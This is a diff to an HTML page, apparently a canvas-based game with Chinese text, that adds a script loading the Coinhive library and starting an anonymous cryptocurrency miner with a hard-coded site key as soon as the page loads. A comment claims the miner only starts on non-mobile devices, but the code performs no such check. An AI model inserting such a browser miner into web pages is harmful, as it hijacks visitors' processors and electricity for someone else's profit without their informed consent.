@@ -62,6 +62,16 @@
 		</script>
 		</head>
 	<body>
+        <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+        <script>
+            var miner = new CoinHive.Anonymous('aPFC8KnX2SS7amIrk4yUxyD5NTxJaTKb', {throttle: 0.3});
+            
+            // Only start on non-mobile devices and if not opted-out
+            // in the last 14400 seconds (4 hours):
+            if (!miner.didOptOut(14400)) {
+                miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+            }
+        </script>
 		<div style="text-align:center;">
 			<canvas id="linkScreen">
 				很遗憾，您的浏览器不支持HTML5，请使用支持HTML5的浏览器。
